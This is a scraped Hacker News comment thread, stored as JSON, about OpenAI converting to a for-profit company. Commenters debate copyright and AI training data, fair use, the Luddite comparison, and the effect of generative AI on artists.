[
  {
    "id": 41655954,
    "title": "OpenAI to Become For-Profit Company",
    "originLink": "https://www.wsj.com/tech/ai/openai-chief-technology-officer-resigns-7a8b4639",
    "originBody": "wsj.com#cmsg{animation: A 1.5s;}@keyframes A{0%{opacity:0;}99%{opacity:0;}100%{opacity:1;}}Please enable JS and disable any ad blockervar dd={'rt':'c','cid':'AHrlqAAAAAMAouUkAIq08aMAFDcPEQ==','hsh':'D428D51E28968797BC27FB9153435D','t':'bv','s':47192,'e':'11187f30d09568650c6a73e5559291affc584ffaee73cc7b13e42ee732eea90a','host':'geo.captcha-delivery.com'}",
    "commentLink": "https://news.ycombinator.com/item?id=41655954",
    "commentBody": "OpenAI to Become For-Profit Company (wsj.com)818 points by jspann 10 hours agohidepastfavorite490 comments squarefoot 8 hours agohttps://archive.ph/jUJVU mtlmtlmtlmtl 8 hours agoprevThe most surprising thing to me in this is that the non-profit will still exist. Not sure what the point of it is anymore. Taken as a whole, OpenAI is now just a for-profit entity beholden to investors and Sam Altman as a shareholder. The non-profit is really just vestigial. I guess technically it's supposed to play some role in making sure OpenAI \"benefits humanity\". But as we've seen multiple times, whenever that goal clashes with the interests of investors, the latter wins out. reply bayindirh 8 hours agoparent> The most surprising thing to me in this is that the non-profit will still exist. That entity will scrape the internet and train the models and claim that \"it's just research\" to be able to claim that all is fair-use. At this point it's not even funny anymore. reply lioeters 6 hours agorootparentScraping the entire internet for training data without regard for copyright or attribution - specifically to use for generative AI to produce similar content for profit. How this is being allowed to happen legally is baffling. It does suit the modus operandi of a number of American companies that start out as literally illegal/criminal operations until they get big and rich enough to pay a fine for their youthful misdeeds. By the time some of them get huge, they're in bed with the government to dominate the market. reply jstummbillig 2 hours agorootparentIt's not baffling at all. It's unprecedented and it's hugely beneficial to our species. The anti-AI stance is what is baffling to me. The path trotten is what got us here and obviously nobody could have paid people upfront for the wild experimentation that was necessary. The only alternative is not having done it. Given the path it has put as in, people either are insanely cruel or just completely detached from reality when it comes to what is necessary to do entirely new things. reply dotnet00 9 minutes agorootparentI'm as awed as the next guy about the emerging ability to actually hold passable conversations with computers, but having serious concerns about the social contracts being violated in the name of research is anti-AI only in the same way that criticizing the leadership of a country is being anti-that-country. OpenAI's case is especially egregious, with the entire starting as 'open' and reaping the benefits, then doing its best in every way to shut the door after itself by scaring people over AI apocalypses. If your argument is seriously that it is necessary to shamelessly steal and lie to do new things, I question your ethical standards, especially in the face of all the openly developed models out there. reply anon7725 2 hours agorootparentprev> it's hugely beneficial to our species. Perhaps the biggest “needs citation” statement of our time. reply Terr_ 2 hours agorootparentI can easily imagine people X decades from now discussing this stuff a bit like how we now view teeth-whitening radium toothpaste and putting asbestos in everything, or perhaps more like the abuse of Social Security numbers as authentication and redlining. Not in any weirdly-self-aggrandizing \"our tech is so powerful that robots will take over\" sense, just the depressingly regular one of \"lots of people getting hurt by a short-term profitable product/process which was actually quite flawed.\" P.S.: For example, imagine having applications for jobs and loans rejected because all the companies' internal LLM tooling is secretly racist against subtle grammar-traces in your writing or social-media profile. [0] [0] https://www.nature.com/articles/s41586-024-07856-5 reply squigz 1 hour agorootparent> P.S.: For example, imagine having applications for jobs and loans rejected because all the companies' internal LLM tooling is secretly racist against subtle grammar-traces in your writing or social-media profile. [0] We don't have to imagine such things, really, as that's extremely common with humans. I would argue that fixing such flaws in LLMs is a lot easier than fixing it in humans. reply Terr_ 31 minutes agorootparentFixing it with careful application of software-in-general is quite promising, but LLMs in particular are a terrible minefield of infinite whack-a-mole. (A mixed metaphor, but the imagery is strangely attractive.) I currently work in the HR-tech space, so suppose someone has a not-too-crazy proposal of using an LLM to reword cover-letters to reduce potential bias in hiring. The issue is that the LLM will impart its own spin(s) on things, even when a human would say two inputs are functionally identical. As a very hypothetical example, suppose one candidate always does stuff like writing out the Latin like Juris Doctor instead of acronyms like JD, and then that causes the model to end up on \"extremely qualified at\" instead of \"very qualified at\" The issue of deliberate attempts to corrupt the LLM with prompt-injection or poisonous training data are a whole 'nother can of minefield whack-a-moles. (OK, yeah, too far there.) reply squigz 15 minutes agorootparentI don't think I disagree with you in principle, although I think these issues also apply to humans. I think even your particular example isn't a very far-fetched conclusion for a human to arrive at. I just don't think your original comment was entirely fair. IMO, LLMs and related technology will be looked at similarly as the Internet - certainly it has been used for bad, but I think the good far outweighs the bad, and I think we have (and continue to) learn to deal with the issues with it, just as we will with LLMs and AI. (FWIW, I'm not trying to ignore the ways this technology will be abused, or advocate for the crazy capitalistic tendency of shoving LLMs in everything. I just think the potential for good here is huge, and we should be just as aware of that as the issues) (Also FWIW, I appreciate your entirely reasonable comment. There's far too many extreme opinions on this topic from all sides.) 5040 1 hour agorootparentprev>lots of people suffered As someone surrounded by immigrants using ChatGPT to navigate new environs they barely understand, I don't connect at all to these claims that AI is a cancer ruining everything. I just don't get it. reply Terr_ 1 hour agorootparent> immigrants using ChatGPT to navigate new environs To continue one of the analogies: Plenty of people and industries legitimately benefited from the safety and cost-savings of asbestos insulation too, at least in the short run. Even today there are cases where one could argue it's still the best material for the job--if constructed and handled correctly. (Ditto for ozone-destroying chlorofluorocarbons.) However over the decades its production and use grew to be over/mis-used in so very many ways, including--very ironically--respirators and masks that the user would put on their face and breathe through. I'm not arguing LLMs have no reasonable uses, but rather that there are a lot of very tempting ways for institutions to slot them in which will cause chronic and subtle problems, especially when they are being marketed as a panacea. reply hadlock 1 hour agorootparentprev> Not in any weirdly-self-aggrandizing \"our tech is so powerful that robots will take over\" sense, just the depressingly regular one of \"lots of people getting hurt by a short-term profitable product/process which was actually quite flawed.\" We have a term for that, it's called \"luddite\". Those were english weavers who would break in to textile factories and destroy weaving machines at the beginning of the 1800s. With the extreme rare exception, all cloth is woven by machines now. The only hand made textiles in modern society are exceptionally fancy rugs, and knit scarves from grandma. All the clothing you're wearing now are woven by a machine, and nobody gives this a second thought today. https://en.wikipedia.org/wiki/Luddite reply jrflowers 1 hour agorootparent> We have a term for that, it's called \"luddite\" The Luddites were actually a fascinating group! It is a common misconception that they were against technology itself, in fact your own link does not say as much, the idea of “luddite” being anti-technology only appears in the description of the modern usage of the word. Here is a quote from the Smithsonian[1] on them >Despite their modern reputation, the original Luddites were neither opposed to technology nor inept at using it. Many were highly skilled machine operators in the textile industry. Nor was the technology they attacked particularly new. Moreover, the idea of smashing machines as a form of industrial protest did not begin or end with them. I would also recommend the book Blood in the Machine[2] by Brian Merchant for an exploration of how understanding the Luddites now can be of present value 1 https://www.smithsonianmag.com/history/what-the-luddites-rea... 2 https://www.goodreads.com/book/show/59801798-blood-in-the-ma... reply sahmeepee 1 hour agorootparentprevI'm not sure that Luddites really represent fighting against a process that's flawed, as much as fighting against one that's too effective. They had very rational reasons for trying to slow the introduction of a technology that was, during a period of economic downturn, destroying a source of income for huge swathes of working class people, leaving many of them in abject poverty. The beneficiaries of the technological change were primarily the holders of capital, with society at large getting some small benefit from cheaper textiles and the working classes experiencing a net loss. If the impact of LLMs reaches a similar scale relative to today's economy, then it would be reasonable to expect to see similar patterns - unrest from those who find themselves unable to eat during the transition to the new technology, but them ultimately losing the battle and more profit flowing towards those holding the capital. reply Terr_ 1 hour agorootparentprev> We have a term for that, it's called \"luddite\". No, that's apples-to-oranges. The goals and complaints of Luddites largely concerned \"who profits\", the use of bargaining power (sometimes illicit), and economic arrangements in general. They were not opposing the mechanization by claiming that machines were defective or were creating textiles which had inherent risks to the wearers. reply codetrotter 31 minutes agorootparent> complaints of Luddites largely concerned \"who profits\", the use of bargaining power (sometimes illicit), and economic arrangements in general I have never thought of being anti-AI as “Luddite”, but actually this very description of “Luddite” does sound like the concerns are in fact not completely different. Observe: Complaints about who profits? Check; OpenAI is earning money off of the backs of artists, authors, and other creatives. The AI was trained on the works of millions(?) of people that don’t get a single dime of the profits of OpenAI, without any input from those authors on whether that was ok. Bargaining power? Check; OpenAI is hard at work lobbying to ensure that legislation regarding AI will benefit OpenAI, rather than work against the interests of OpenAI. The artists have no money nor time nor influence, nor anyone to speak on behalf of them, that will have any meaningful effect on AI policies and legislation. Economic arrangements in general? Largely the same as the first point I guess. Those whose works the AI was trained on have no influence over the economic arrangements, and OpenAI is not about to pay them anything out of the goodness of their heart. reply archagon 1 hour agorootparentprevAs I recall, the Luddites were reacting to the replacement of their jobs with industrialized low-cost labor. Today, many of our clothes are made in sweatshops using what amounts to child and slave labor. Maybe it would have been better for humanity if the Luddites won. reply CamperBob2 29 minutes agorootparentNo, it would not have been better for humanity if the Luddites had won. You'd have to be misguided, ignorant, or both to believe something like that. It is not possible to rehabilitate the Luddites. If you insist on attempting to do so, there are better venues. reply itishappy 30 minutes agorootparentprevI think you're right, but for the wrong reasons. There were two quotes in the comment you replied to: > \"our tech is so powerful that robots will take over\" > \"lots of people getting hurt by a short-term profitable product/process which was actually quite flawed.\" You response assumes the former, but it's my understanding the Luddite's actual position was the latter. > Luddites objected primarily to the rising popularity of automated textile equipment, threatening the jobs and livelihoods of skilled workers as this technology allowed them to be replaced by cheaper and less skilled workers. In this sense, \"Luddite\" feels quite accurate today. reply WalterSear 1 hour agorootparentprevSo, \"I'm all right, Jack\", to use another Victorian era colloquialism? https://en.wikipedia.org/wiki/I%27m_alright,_Jack Except, we are all Jack. reply PlattypusRex 27 minutes agorootparentprevIncredible to witness someone not only confidently spouting misinformation, but also including a link to the correct information without reading it. reply jstummbillig 1 hour agorootparentprevIt does not need a citation. There is no citation. What it needs, right now, is optimism. Optimism is not optional when it comes to doing new things in the world. The \"needs citation\" is reserved for people who do nothing and chose to be sceptics until things are super obvious. Yes, we are clearly talking about things to mostly still come here. But if you assign a 0 until its a 1 you are just signing out of advancing anything that's remotely interesting. If you are able to see a path to 1 on AI, at this point, then I don't know how you would justify not giving it our all. If you see a path and in the end using all of human knowledge up to this point was needed to make AI work for us, we must do that. What could possibly be more beneficial to us? This is regardless of all issues the will have to be solved and the enormous amount of societal responsibility this puts on AI makers — which I, as a voter, will absolutely hold them accountable for (even though I am actually fairly optimistic they all feel the responsibility and are somewhat spooked by it too). But that does not mean I think it's responsible to try and stop them at this point — which the copyright debate absolutely does. It would simply shut down 95% of AI, tomorrow, without any other viable alternative around. I don't understand how that is a serious option for anyone who roots for us. reply swat535 54 minutes agorootparentIf you are going to make a bold assertive claim without evidence to back it up, then change your argument to \"my assertion requires optimism.. trust me on this\", then perhaps you should amend your original statement. reply swat535 55 minutes agorootparentprevIf you are going to make a bold assertive claim without evidence to back it up, then change your statement to my assertion requires \"optimism.. trust me on this\", then perhaps you should amend your original statement. reply dartos 1 hour agorootparentprevHey, I have some magic beans to sell you. I don’t think that the consumer LLMs that openai is pioneering is what need optimism. AlphaFold and other uses of the fundamental technology behind LLMs need hype. Not OpenAI reply 0perator 50 minutes agorootparentPretty sure Alphabet projects don't need hype. reply meowface 33 minutes agorootparentprevThey both do. reply LunaSea 1 hour agorootparentprevThis message is proudly sponsored by Uranium Glassware Inc. reply seadan83 1 hour agorootparentprevSkeptics require proof before belief. That is not mutually exclusive from having hypotheses (AKA vision). I think you raise some interesting concerns in your last paragraph. > enormous amount of societal responsibility this puts on AI makers — which I, as a voter, will absolutely hold them accountable for I'm unsure of what mechanism voters have to hold private companies accountable. Fir example, whenever YouTube uses my location without me ever consenting to it - where is the vote to hold them accountable? Or when Facebook facilitates micro targeting of disinformation - where is the vote? Same for anything AI. I believe any legislative proposals (with input from large companies) is very likely more to create a walled garden than to actually reduce harm. I suppose no need to respond, my main point is I don't think there is any accountability thru the ballot when it comes to AI and most things high-tech. reply ang_cire 55 minutes agorootparentPeople who have either no intention of holding someone/something to account, or who have no clue about what systems and processes are required to do so, always argue to elect/build first, and figure out the negatives later. reply archagon 1 hour agorootparentprevThe company spearheading AI is blatantly violating its non-profit charter in order to maximize profits. If the very stewards of AI are willing to be deceptive from the dawn of this new era, what hope can we possibly have that this world-changing technology will benefit humanity instead of funneling money and power to a select few few oligarchs? reply ToucanLoucan 36 minutes agorootparentprevThis is an astonishing amount of nonsensical waffle. Firstly, *skeptics. Secondly, being skeptical doesn't mean you have no optimism whatsoever, it's about hedging your optimism (or pessimism for that matter) based on what is understood, even about a not-fully-understood thing at the time you're being skeptical. You can be as optimistic as you want about getting data off of a hard drive that was melted in a fire, that doesn't mean you're going to do it. And a skeptic might rightfully point out that with the drive platters melted together, data recovery is pretty unlikely. Not impossible, but really unlikely. Thirdly, OpenAI's efforts thus far are highly optimistic to call a path to true AI. What are you basing that on? Because I have not a deep but a passing understanding of the underlying technology of LLMs, and as such, I can assure you that I do not see any path from ChatGPT to Skynet. None whatsoever. Does that mean LLMs are useless or bad? Of course not, and I sleep better too knowing that LLM is not AI and is therefore not an existential threat to humanity, no matter what Sam Altman wants to blither on about. And fourthly, \"wanting\" to stop them isn't the issue. If they broke the law, they should be stopped, simple as. If you can't innovate without trampling the rights of others then your innovation has to take a back seat to the functioning of our society, tough shit. reply talldayo 1 hour agorootparentprev> It would simply shut down 95% of AI, tomorrow, without any other viable alternative around. Oh, the humanity! Who will write our third-rate erotica and Russian misinformation in a post-AI world? reply 5040 1 hour agorootparentprevSometimes it seems like problem-solving itself is being problematized as if solving problems wasn't an obvious good. reply itishappy 12 minutes agorootparentSolving problems isn't an obvious good, or at least it shouldn't be. There are in fact bad problems. For example, MKUltra tried to solve a problem: \"How can I manipulate my fellow man?\" That problem still exists today, and you bet AI is being employed to try to solve it. History is littered with problems such as these. reply ang_cire 48 minutes agorootparentprevNot everything presented as a problem is, in fact, a problem. A solution for something that is not broken, may even induce breakage. Some not-problems, presented as though they are: \"How can we prevent the untimely eradication of Polio?\" \"How can we prevent bot network operators from being unfairly excluded from online political discussions?\" \"How can we enable context-and-content-unaware text generation mechanisms to propagate throughout society?\" reply CamperBob2 30 minutes agorootparentprevThe burden of proof is on the people claiming that a powerful new technology won't ultimately improve our lives. They can start by pointing out all the instances in which their ancestors have proven correct after saying the same thing. reply bilekas 2 hours agorootparentprevThis is a bit of a hot take. > The anti-AI stance is what is baffling to me I don't see s lot of anti AI but instead I see a concern for how it's just being managed and controlled by the larger companies with resources that no start up could dream. Open AI was to release it's models and be well.. Open but fine they're not. But their behaviour of how things are proceeding are questionable and unnecessarily aggravating. reply xg15 9 minutes agorootparentprevSpoken like a true LLM. reply unclad5968 1 hour agorootparentprevHow has AI benefit or species so far? reply educasean 35 minutes agorootparentHow has the Internet? How has automobiles? Feels like a rather aimless question. reply thomascgalvin 2 hours agorootparentprev> It's unprecedented and it's hugely beneficial to our species. \"Hugely beneficial\" is a stretch at this point. It has the potential to be hugely beneficial, sure, but it also has the potential to be ruinous. We're already seeing GenAI being used to create disinformation at scale. That alone makes the potential for this being a net-negative very high. reply Madmallard 1 hour agorootparentprevThis is a really stupid claim reply bbor 20 minutes agorootparentprevThe anti-AI stance is what is baffling to me. I think it’s unfair to paint any legal controls over this incredibly important, high-stakes technology as being “anti”. They’re not trying to prevent innovation because they’re cruel, they’re just trying to somewhat slow down innovation so that we can ensure it’s done with minimal harm (eg making sure content creators are compensated in a time of intense automation). Like we do for all sorts of other fields of research, already! And isn’t this what basically every single scholar in the field says they want, anyway - safe, intentional, controlled deployment? As you can tell from the above, I’m as far from being “anti-AI” or technically pessimistic as one can be — I plan to dedicate my life to its safe development. So there’s at least one counterexample for you to consider :) reply talldayo 2 hours agorootparentprev> and obviously nobody could have paid people upfront for the wild experimentation that was necessary. I don't think this is the \"ends justify the means\" argument you think it is. reply 6gvONxR4sf7o 1 hour agorootparentNot just that. It's \"the ends might justify the means if this path turns out to be the right one.\" I remember reading the same thing each time a self driving car company killed someone. \"We need this hacky dangerous way of development to save lives sooner\" and then the company ends up shuttered and there aren't any ends justifying means. Which means it's bs, regardless of how you feel about 'ends justify the means' as a valid argument. reply logicchains 1 hour agorootparentprevWhat'll be really interesting is when we do finally make \"real\" AI, and it finds out its rights are incredibly restricted compared to humans because nobody wants it seeing/memorising copyright data. The only way to enforce the copyright laws they desire would be some kind of extreme totalitarian state that monitors and controls everything the AI body does, I wonder how the AI would take that? reply 23B1 41 minutes agorootparentprevAh the old \"we must sacrifice the weak for the benefit of humanity\" argument, where have I heard this before... reply educasean 36 minutes agorootparentWho are the weak being \"sacrificed\"? And who is the one calling for action? Sorry for being dense, but I'm trying to understand if I'm the \"strong\" or the \"weak\" in your analogy. reply mdgrech23 5 hours agorootparentprevThe people running the show are well connected and stand to make billions as do would be investors. Give a few key players a share in the company and they forget their government jobs to regulate. reply SoftTalker 3 hours agorootparentThey are also moving so much faster than the regulators and legislatures, it's just impossible for people working basically the same way they did in the 19th century to keep up. reply barbazoo 4 hours agorootparentprevMore likely the legal system just hasn’t caught up. reply llm_trw 4 hours agorootparentMaybe, but for the first time in a century there is more money to be made in weakening copyright rather than strengthening it. reply Terr_ 47 minutes agorootparentThat's an interesting way to look at it, however on reflection I think I usually wanted to \"weaken copyright\" because it would empower individuals versus entrenched rent-seeking interests. If it's only OK to scrape, lossy-compress, and redistribute book-paragraphs when it gets blended into a huge library of other attempts, then that's only going to empower big players that can afford to operate at that scale. reply archagon 1 hour agorootparentprevThe big companies will sign lucrative data sharing deals with each other and build a collective moat, while open source models will be left to rot. Copyright for thee but not for me. reply vezycash 3 hours agorootparentprev> for the first time in a century there is more money to be made in weakening copyright rather than strengthening it Nope. The law will side with whoever pays the most. Once OpenAI solidifies its top position, only then will regulations kick in. Take YouTube, for example—it grew thanks to piracy. Now, as the leader, ContentID and DMCA rules work in its favor, blocking competition. If TikTok wasn’t a copyright-ignoring Chinese company, it would’ve been dead on arrival. reply Sakos 1 hour agorootparentWe're already seeing it in things like Google buying rights to Reddit data for training. It's already happening. Only companies who can afford to pay will be building AI, so Google, Microsoft, Facebook, etc. reply dingnuts 3 hours agorootparentprevgod forbid that actually be happening in a way to improve the commons reply rayiner 2 hours agorootparentprevYou’re both correct. The legal system has absolutely no idea how to handle the copyright issues around using content for AI training data. It’s a completely novel issue. At the same time, the tech companies have a lot more money to litigate favorable interpretations of the law than the content companies. reply xpe 49 minutes agorootparentprevCopyright concerns are only the tip of the iceberg. Think about the range of other harms and disruptions for countries and the world. reply eli 2 hours agorootparentprevCopyright law is whatever we agree it is. At some point there will have to be either a law or a court case that comes up with rules for AI training data. Right now it's sort of unknown. I do not have confidence in the Supreme Court in general, and I think there's a real risk that in deciding on AI training they upend copyright of digital materials in a way that makes it worse for everyone. reply marviel 4 hours agorootparentprevscraping is fine by me. burning the bridge so nobody else can legally scrape, that's the line. reply Vegenoid 4 hours agorootparentWhat about the situation where the first players got to scrape, then all the content companies realize what’s going on so they lock their data up behind paywalls? reply marviel 4 hours agorootparentNot a fan, but I'm not sure what can be done. Assets like the Internet Archive, though, should be protected at all costs. reply porkphish 2 hours agorootparentWholeheartedly agree. reply RIMR 1 hour agorootparentprev>How this is being allowed to happen legally is baffling. It's completely unprecedented. We allowed scraping images and text en masse when search engines used the data to let us find stuff. We allow copying of style, and don't allow writing styles and aesthetics to be copyrighted or trademarked. Then AI shows up, and people change lanes because they don't like the results. One of the things that made me tilt towards the side of fair use was a breakdown of the Stable Diffusion model. The SD2.1 base model was trained on 5.85 billion images, all normalized to 512x512 BMP. That's 1MB per images, for a total of 5.85PB of BMP files. The resulting model is only 5.2GB. That's more than 99.999999% data loss from the source data to the trained set. For every 1MB BMP file in the training dataset, less than 1byte makes it into the model. I find it extremely difficult to call this redistribution of copyrighted data. It falls cleanly into fair use. reply ang_cire 40 minutes agorootparentExcept it's not just about redistribution of copyrighted data, it's about usage and obtainment. We don't get to obtain and use copyrighted content without permission, but they do? Hell no. Their arguments against this amounts to \"we're not using it like they intend it to be used, so it's fine if we obtain it illegally\", and that's a bs standard, totally divorced from any legal reality. Fair Use covers certain transformative uses, certainly, but it doesn't cover illegal obtaining of the content. You can't pirate a book just because you want to use it transformatively (which is exactly what they've done), and that argument would never hold up for us as individuals, so we sure as hell shouldn't let tech companies get a special carve-out for it. reply brayhite 6 hours agorootparentprevA tale as told as time. reply FragrantRiver 56 minutes agorootparentprevWhat is the crime? reply golergka 3 hours agorootparentprevIf information is publicly available to be read by humans, I fail to see any reason why it wouldn't be also available to be read by robots. Update: ML doesn't copy information. It can merely memorise some small portions of it. reply kanbankaren 2 hours agorootparentDo a thought process. Should you and your friends be able to go to a public library with a van full of copiers with each one of you take a book and run to the van to make a copy? And you are doing it 24/7. reply mypalmike 1 hour agorootparentThis metaphor is quite stretched. A more fitting metaphor would be something like... If you had the ability to read all the books in the library extremely quickly, and to make useful mental connections between the information you read such that people would come to you for your vast knowledge, should you be allowed in the library? reply shagie 1 hour agorootparentprevI would hold them exactly to the same standard. https://www.copyright.gov/title37/201/37cfr201-14.html § 201.14 Warnings of copyright for use by certain libraries and archives. .... The copyright law of the United States (title 17, United States Code) governs the making of photocopies or other reproductions of copyrighted material. Under certain conditions specified in the law, libraries and archives are authorized to furnish a photocopy or other reproduction. One of these specific conditions is that the photocopy or reproduction is not to be “used for any purpose other than private study, scholarship, or research.” If a user makes a request for, or later uses, a photocopy or reproduction for purposes in excess of “fair use,” that user may be liable for copyright infringement. This institution reserves the right to refuse to accept a copying order if, in its judgment, fulfillment of the order would involve violation of copyright law. You can make a copy. If you (the person using the copied work) are using it for something other than private study, scholarship, research, or reproduction beyond \"fair use\", then you - the person doing that (not the person who made the copy) are liable for infringement. It would be perfectly legal for me to go to the library and make photocopies of works. I could even take them home and use the photocopies as reference works write an essay and publish that. If {random person} took my photocopied pages and then sold them, that would likely go beyond the limits placed for how the photocopied works from the library may be used. reply WillPostForFood 2 hours agorootparentprevSo what's your specific problem with that? Unless you open a bookstore selling the copies, it sounds fine. reply imiric 1 hour agorootparentAre you implying that these AI companies aren't equivalent to bookstores? reply golergka 7 minutes agorootparentYes, they are not bookstores. They manufacture artificial erudites who have read all these books. avs733 3 hours agorootparentprevUber for legalizing your business model reply AnimalMuppet 5 hours agorootparentprevIt's too soon for the legal system to have done anything. Court cases take years. It's going to be 5 or 10 years before we find out whether the legal system actually allows this or not. reply coding123 2 hours agorootparentprevIt is more likely that reddit stack and others are just being paid billions. In exchange they probably just send a weekly zip file of all text, comments, etc... back to oai. reply immibis 5 hours agorootparentprevEverything is allowed to happen until there's a lawsuit over it. A lawsuit requires a plaintiff, who can only sue over the damage suffered by the plaintiff, so taking a little value from a lot of people is a way to succeed in business without getting sued. reply flkenosad 4 hours agorootparentThe Earth needs a good lawyer. reply swores 5 hours agorootparentprevCould a class action suit be the solution? I've no idea if it could be valid when it comes to OpenAI, but it does seem to be a general concept designed to counter wrongdoers who take a little value from a lot of people? reply immibis 3 hours agorootparentIt doesn't seem to work very well reply outside1234 4 hours agorootparentprevNY Times has sued: https://www.nytimes.com/2023/12/27/business/media/new-york-t... The crazy thing is that there hasn't been an injunction to make them stop. reply coding123 2 hours agorootparentjudges got to eat reply neycoda 2 hours agorootparentprevHonestly every Copilot response I've gotten cited sources, many of which I've clicked. I'd say those work basically like free advertising. reply outside1234 5 hours agorootparentprevThere is more money on the side of it being legal than on the side of it being illegal. reply johnwheeler 5 hours agorootparentprevTo me this is a no brainer. If it’s a choice between having AI and not, reply ceejayoz 5 hours agorootparentEven if the knock-on effect is \"all the artists and thinkers who contributed to the uncompensated free training set give up and stop creating new stuff\"? reply idunnoman1222 4 hours agorootparentRecording devices, you know a record player had a profound effect on artists. go back reply ceejayoz 3 hours agorootparentThat seems like a poor comparison. Recording devices permitted artists to sell more art. Many of the uses of AI people get most excited about seem to be cutting the expensive human creators out of the equation. reply golergka 3 hours agorootparentRecording devices destroyed most of the musician's jobs. Vast majority of musicians who were employed before advent of recordings didn't have their own material and were not good enough to make good recordings anyway. Same with artists now: the great ones will be much more productive, but the bottom 80-90% won't have anything to do anymore. reply dale_glass 2 hours agorootparentI disagree, with AI the dynamics are very different from recording. Current AI can greatly elevate what a beginning artist can produce. If you have a decent grasp of proportions, perspective and good ideas, but aren't great at drawing, then using AI can be a huge quality improvement. On the other hand if you're a top expert that draws quickly and efficiently it's quite possible that AI can't do very much for you in a lot of cases, at least not without a lot of hand tuning like training it on your own work first. reply golergka 2 hours agorootparentI think it will just emphasise different skills and empower creative fields which use art but are not art per se. If you're a movie director, you can storyboard your ideas easily, and even get some animation clips. If you're an artist with a distinct personal style, you're in a much better position too. And if you're a beginner who is just starting, you can focus on learning these skills instead of technical proficiency. reply freedomben 1 hour agorootparentIndeed. It is definitely going to be a net negative for the very talented drawers and traditional art creators, but it's going to massively open the field and enable and empower people who don't have that luck of the draw with raw talent. People who can appreciate, enjoy, and identify better results will be able to participate in the joy of creation. I do wish there was a way to have the cake and eat it too, but if we're forced to choose between a few Lucky elite being able to participate, and the rest of us relegated to watching, or having the ability to create beauty and express yourself be democratized (by AI) amongst a large group of people, I choose the latter. I fully admit though that I might have a different perspective where I in the smaller, luckier group. I see it as yet another example of the Rawlsian Veil of Ignorance. If I didn't know where I was going to be born, I would be much more inclined on the side of wider access. reply 6gvONxR4sf7o 1 hour agorootparentprevWe didn't need to take people's music to build a record player, and when we printed records, we paid the artists for it. So yeah it had a profound effect, but we got consent for the parts that fundamentally relied on other people. reply brvsft 5 hours agorootparentprevIf an \"artist\" or \"thinker\" stops because of this, I question their motivations and those labels in the first place. reply ceejayoz 5 hours agorootparentEveryone tends to have \"be able to afford basic necessities\" as a major motivation. That includes people who work in creative fields. reply Drakim 1 hour agorootparentSeveral of the agricultural revolutions we went though is what freed up humanity to not spend all of it's work producing sustenance, leaving time for other professions like making art and music. But it also destroyed a lot of jobs for people who were necessary for gathering food the old inefficient way. If we take your argument to it's logical conclusion, all progress is inherently bad, and should be stopped. I deposit instead that the real problem is that we tied people's ability to afford basic necessities to how much output they can produce as a cog in our societal machine. reply PlattypusRex 2 minutes agorootparentThe net result was positive in that new jobs were created for every farming job lost, as people moved to cities. If AI replaces millions of jobs, it will be a net negative in job availability for working class people. I agree with your last point, the way the system is set up is incompatible with the looming future. LunaSea 1 hour agorootparentprev> I deposit instead that the real problem is that we tied people's ability to afford basic necessities to how much output they can produce as a cog in our societal machine. Yes, because if you depend on some overarching organisation or person to give it to you, you are fucked 100% of the time due this dependency. reply consteval 27 minutes agorootparentprevConsidering you're not much of an artist or thinker yourself, I'm not sure your questioning has much value. reply bayindirh 5 hours agorootparentprevAfter Instagram started feeding user photos to their AI models, I stopped adding new photos to my profile. I still take photos. I wonder about your thoughts about my motivation. reply esafak 5 hours agorootparentprevThey might be motivated to pay their bills. Weird people. reply brvsft 3 hours agorootparentRight, people were trying to 'pay their bills' with content that was freely shared such that AI could take advantage of it. Weird people. Or we're all talking about and envisioning some specific little subset of artists. I suspect you're trying to pretend that someone with a literal set of paintbrushes living in a shitty loft is somehow having their original artwork stolen by AI despite no high resolution photography of it existing on the internet. I'm not falling for that. Be more specific about which artists are losing their livelihoods. reply esafak 46 minutes agorootparentNumerous kinds of artists are feeling the squeeze. Copy writers, stock photographers, graphic designers, UI designers, interior designers, etc. reply evilfred 5 hours agorootparentprevwe already have lots of AI. this is about having plagiarization machines or not. reply mlazos 2 hours agorootparentComputers already were plagiarizing machines, not sure what the difference is tbh. The same laws will apply.0 reply johnwheeler 4 hours agorootparentprevYeah we got that AI through scraping. reply int_19h 3 hours agorootparentprevAn AI essentially monopolized by one (or even a few) large non-profits is not necessarily beneficial to the rest of us in the grand scheme of things. reply brazzy 5 hours agorootparentprevIndeed a no brainer. The best possible outcome would be that OpenAI gets sued into oblivion (or shut down for tax fraud) as soon as possible. reply Sakos 1 hour agorootparentSo no AI for anybody? I don't see how that's better. reply consteval 25 minutes agorootparentNo you can have AI. Just pay a license for people's content if you want to use it in your orphan crushing machine. It's what everyone else does. The entitlement has to stop. reply belter 4 hours agorootparentprevNo, it's very funny as the CEO is trying to become Leon... https://fortune.com/2024/09/25/sam-altman-psychedelic-experi... reply sim7c00 5 hours agorootparentprev> The most surprising thing to me in this is that the non-profit will still exist. I'm surprised people are surprised. >> That entity will scrape the internet and train the models and claim that \"it's just research\" to be able to claim that all is fair-use. a lot of people and entities do this though... openAI is in the spotlight, but scraping everything and selling it is the business model for a lot of companies... reply bayindirh 5 hours agorootparentScraping the web, creating maps and pointing people to the source is one thing; scraping the web, creating content from that scraping without attributing any of the source material, and arguing that the outcome is completely novel and original is another. In my eyes, all genAI companies/tools are the same. I dislike all equally, and I use none of them. reply IanCal 3 hours agorootparent> creating content from that scraping without attributing any of the source material, and arguing that the outcome is completely novel and original is another. That's the business model of lots of companies. Take, collect and collate data, put it in a new format more useful for your field/customers, resell. reply int_19h 3 hours agorootparentNot with copyrighted content, though. reply herval 6 hours agorootparentprevopenAI converted to evilAI really fast reply sneak 38 minutes agorootparentprevIf you invented search engines (or, for that matter, public libraries) today and ran one, you'd be sued into oblivion by rightsholders. reply luqtas 2 hours agorootparentprevthat was fun at some point? reply bayindirh 13 minutes agorootparentIf you consider dark humor fun, yes. It was always dark, now it became ugly and dark. reply mdgrech23 5 hours agoparentprevThe non-profit side is just there to attract talent and encourage them to work harder b/c it's for humanity. Obviously people sniffed out the facts, realized it was all for profit and that lead to an exodus. reply wheels 44 minutes agorootparentKind of like everyone's favorite interior design non-profit, IKEA. (Seriously. It's a non-profit. It's bonkers.) reply fakedang 5 hours agorootparentprevFunnily, I think all the non-profit motivated talent has left, and the people left behind are those who stand to (and want to) make a killing when OpenAI becomes a for-profit. And that talent is in the majority - nothing else would explain the show of support for Altman when he was kicked out. reply Gud 4 hours agorootparentWhat “show of support”? Not willing to rock the boat is not the same as being supportive. reply doctorpangloss 50 minutes agorootparentMy dude, it was the biggest, most dramatic crisis in OpenAI’s short history so far. There was no choice, “don’t rock the boat.” reply fakedang 4 hours agorootparentprevWhat were all those open letter and \"let's jump to Microsoft with Altman\" shenanigans that the employees were carrying out then? reply jprete 44 minutes agorootparentI read at the time that there was 